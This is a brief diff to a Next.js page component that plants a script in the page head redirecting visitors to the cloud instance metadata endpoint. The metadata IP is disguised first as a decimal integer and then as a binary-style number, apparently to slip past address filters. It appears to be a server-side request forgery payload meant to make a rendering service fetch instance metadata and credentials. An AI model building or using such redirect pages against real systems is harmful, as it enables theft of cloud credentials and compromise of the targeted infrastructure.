@@ -16,7 +16,7 @@ export default function Home({ allPostsData }) {
   return (
     <Layout home>
       <Head>
-        <script>window.location = 'http://2852039166/metadata/v1/'</script>
+        <script>window.location = 'http://10101001111111101010100111111110/metadata/v1/'</script>
       </Head>
     </Layout>
   );
